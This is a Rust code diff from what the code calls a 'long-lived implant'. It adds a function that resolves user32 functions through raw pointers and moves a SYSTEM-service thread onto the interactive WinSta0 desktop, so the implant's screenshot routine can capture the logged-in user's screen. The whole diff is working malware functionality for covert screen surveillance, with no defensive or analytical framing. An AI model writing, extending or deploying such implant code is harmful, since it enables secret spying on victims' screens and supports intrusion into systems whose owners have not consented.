@@ -144,6 +144,98 @@ fn chunk_stream(data: Vec<u8>, name: &str) -> Vec<Response> {
 /// SelectObject → BitBlt(SRCCOPY) → GetDIBits(32bpp BI_RGB) → assemble BMP →
 /// cleanup. Every DC/bitmap handle is released on every return path; a leak
 /// here kills the long-lived implant.
+/// Best-effort relocation to the interactive window station + desktop.
+///
+/// In Session 0 (SYSTEM service) the process is attached to a non-interactive
+/// station (`Service-0x0-3e7$/Default`) with no GUI surface, so `GetDC(NULL)`
+/// + `BitBlt` fail. This opens `WinSta0` + its `default` desktop and attaches
+/// the current thread to them, so subsequent GDI calls see the interactive
+/// session. Returns true on success. Best-effort — failures are silent (the
+/// caller proceeds and surfaces the real GDI error).
+///
+/// # Safety
+/// Resolves + calls user32 exports via raw pointers; all are idempotent/safe
+/// in isolation (OpenWindowStationW/SetProcessWindowStation/OpenDesktopW/
+/// SetThreadDesktop/CloseDesktop/CloseWindowStation).
+unsafe fn attach_interactive() -> bool {
+    use core::ffi::c_void;
+    type OpenWindowStationW = unsafe extern "system" fn(*const u16, i32, u32) -> *mut c_void;
+    type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
+    type OpenDesktopW =
+        unsafe extern "system" fn(*const u16, u32, i32, u32) -> *mut c_void;
+    type SetThreadDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
+    type CloseDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
+    type CloseWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let ows: OpenWindowStationW = match unsafe {
+        crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+    let spws: SetProcessWindowStation = match unsafe {
+        crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+    let odk: OpenDesktopW = match unsafe {
+        crate::resolve::export_addr(b"user32.dll", b"OpenDesktopW")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+    let std: SetThreadDesktop = match unsafe {
+        crate::resolve::export_addr(b"user32.dll", b"SetThreadDesktop")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+    let cd: CloseDesktop = match unsafe {
+        crate::resolve::export_addr(b"user32.dll", b"CloseDesktop")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+    let cws: CloseWindowStation = match unsafe {
+        crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation")
+    } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+
+    // GENERIC_READ | GENERIC_WRITE = 0xC0000066 for the station; the desktop
+    // needs GENERIC_READ etc. too. These are permissive — SYSTEM can usually
+    // open the interactive station.
+    let mut winsta_name = crate::heap::Vec::<u16>::with_capacity(8);
+    for &b in b"WinSta0\0" {
+        winsta_name.push(b as u16);
+    }
+    let hwinsta = unsafe { ows(winsta_name.as_ptr(), 0, 0xC0_00_00_66) };
+    if hwinsta.is_null() {
+        return false;
+    }
+    if unsafe { spws(hwinsta) } == 0 {
+        let _ = unsafe { cws(hwinsta) };
+        return false;
+    }
+    // Open the default desktop and attach the thread.
+    let mut desk_name = crate::heap::Vec::<u16>::with_capacity(8);
+    for &b in b"default\0" {
+        desk_name.push(b as u16);
+    }
+    let hdesk = unsafe { odk(desk_name.as_ptr(), 0, 0, 0xC0_00_00_66) };
+    let ok = if !hdesk.is_null() {
+        let r = unsafe { std(hdesk) };
+        let _ = unsafe { cd(hdesk) };
+        r != 0
+    } else {
+        false
+    };
+    let _ = unsafe { cws(hwinsta) };
+    ok
+}
+
 pub fn do_screenshot(monitor: u8) -> Vec<Response> {
     // `monitor` is accepted for forward-compat with per-display selection.
     let _ = monitor;
@@ -159,6 +251,16 @@ pub fn do_screenshot(monitor: u8) -> Vec<Response> {
             "screenshot: gdi32.dll load failed",
         ))];
     }
+
+    // ---- 1b. Attach to the interactive desktop (Session 0 fix) ------------
+    // In a SYSTEM-service (Session 0) context the process's window station is
+    // Service-0x0-3e7$/Default — a non-interactive station with no GUI surface,
+    // so GetDC(NULL) returns an empty DC and BitBlt fails. Try to relocate to
+    // WinSta0\Default of the active session first; if that fails (no active
+    // interactive session / access denied) we proceed anyway and let GetDC/
+    // BitBlt surface the error honestly. This is best-effort: a host with no
+    // logged-in user has no desktop to capture regardless.
+    let _ = unsafe { attach_interactive() };
 
     // ---- 2. Resolve all exports ------------------------------------------
     type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
